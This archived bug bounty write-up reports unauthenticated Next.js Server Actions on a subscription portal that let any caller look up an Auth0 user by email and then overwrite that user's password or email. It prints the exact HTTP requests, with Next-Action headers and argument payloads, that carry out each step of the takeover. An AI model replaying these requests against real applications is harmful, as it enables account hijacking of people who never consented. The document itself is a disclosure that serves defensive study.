# Unauthenticated Next.js Server Actions Leading to Zero Click Account Takeover

- **Source URL:** https://medium.com/@mahmoudfarag.rm4/unauthenticated-next-js-server-actions-leading-to-zero-click-account-takeover-0b7d3d5a1039
- **Fetched from:** https://web.archive.org/web/20261111075319/https://medium.com/@mahmoudfarag.rm4/unauthenticated-next-js-server-actions-leading-to-zero-click-account-takeover-0b7d3d5a1039
- **Fetched:** 2026-11-19
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/14915 (id 14915)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Unauthenticated Next.js Server Actions Leading to Zero Click Account Takeover

الحمد لله، والصلاة والسلام على رسول الله

**Hello, I’m Mahmoud Farag (RM4).**

I’d like to share a security finding I discovered during my research.

A subscription portal exposed two Next.js Server Actions without any authentication or authorization checks.

The first accepts an **email address** and returns the corresponding user’s Auth0 account information. The second allows an unauthenticated caller to set the **password of any user ID they provide**, resulting in account takeover.

## How I found it

The app was Next.js App Router, which means Server Actions — server functions called straight from React components. The framework gives each one a 40-hex-character ID, ships that ID to the browser in the client bundle, and turns the call into a POST carrying a \`Next-Action\` header.

That header is the part that matters. Dispatch happens on it rather than on the path, and the request body is simply the function’s arguments, positionally. There’s no route file to wrap in middleware — so if the authorization check isn’t inside the function body, there isn’t one.

So I pulled the IDs out of the bundle, worked out each function’s arguments from the minified call sites around them, and replayed them with my cookies stripped.

Two of them answered.

## Step 1 — an email goes in, an Auth0 user comes out

Sent with no cookies, no **Authorization** header, nothing:

```
POST /particuliers/integrale-web-mensuel-2116 HTTP/2
Host: subdomain.target.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Next-Action: 42a24b711d12f695d798b371e38b584c551ebb6a
Content-Type: text/plain;charset=UTF-8
Accept: text/x-component
["victim@gmail.com",true]
```
It came back with the account:

```
{
"user_id": "auth0|000000000000000000000001",
"email": "researcher@example.com",
"identities": [
{ "provider": "auth0", "connection": "www-target-com" }
],
"app_metadata": {
"subscriber_number": "900000000",
"custom_user_id": "00000000–0000–4000–8000–000000000000"
}
}
```
**identities** and **app\_metadata** don’t come from Auth0’s public Authentication API. They come from the **Management API** — the admin one, reached with a machine-to-machine token holding scopes like **read:users** and **update:users**.

Which told me there’s a privileged Auth0 token on that server, and an unauthenticated function I control is holding it.

That alone is a finding. But it hands you two things the next action wants: a **user\_id** and a **connection**.

## Step 2 — the takeover

The second action took an object and a string. The object had **password** and **connection**. The string wanted a user id.

## Get Mahmoud Farag’s stories in your inbox

Join Medium for free to get updates from this writer.

Against my own test account, still unauthenticated:

```
POST / HTTP/2
Host: subdomain.target.com
Next-Action: 89abcdef0123456789abcdef0123456789abcdef
Content-Type: text/plain;charset=UTF-8
Accept: text/x-component
[{"password":"<REDACTED>","connection":"www-target-com"},"auth0|000000000000000000000001"]
```
No cookie. No current password. No reset token, no email confirmation, no step-up.

**200 OK**, with the updated user object in the response.

Look at where the user id lives: it’s **argument two**. Not read from a session, not taken from a JWT **sub** claim — supplied by the caller. The server changes whichever account it’s told to.

I logged out, went to the login page, and signed in with the password I’d just set.

It worked.

## The same action takes an email

The first argument is passed through to the Auth0 user update, so the field you put in it is the field that changes. Swap \`password\` for \`email\`:

```
POST / HTTP/2
Host: subscribe.target.com
Next-Action: 89abcdef0123456789abcdef0123456789abcdef
Content-Type: text/plain;charset=UTF-8
Accept: text/x-component
[{"email":"attacker@example.com","connection":"www-target-com"},"auth0|000000000000000000000001"]
```
**Same 200**, same lack of any check that I own the account I’m editing.

That one matters more than it looks. The address on the account is where password resets are delivered — so once it’s the attacker’s address, the owner’s own recovery path stops leading back to them.

I logged out, went to the login page, and signed in with the password I’d just set.

It worked.

### Impact

This is an account takeover. At the end of it I’m signed in as the victim, with a password I chose.

\- **Who’s affected**:any subscriber, identified only by their email address.

- **What the attacker needs**: nothing else — no session, no password, no token, no click from the victim.

- **What they get**:the account, and whatever a signed-in customer can see and do in it — personal details, subscription and billing state.

Because the password is set rather than a session borrowed, the access doesn’t expire on its own.

Thank you for taking the time to read my write-up.

## Social: [linkedin.com/in/mahmoud-farag4](https://www.linkedin.com/in/mahmoud-farag4?utm_source=chatgpt.com)

#BugBounty #WebSecurity #AccountTakeover #NextJS #CyberSecurity
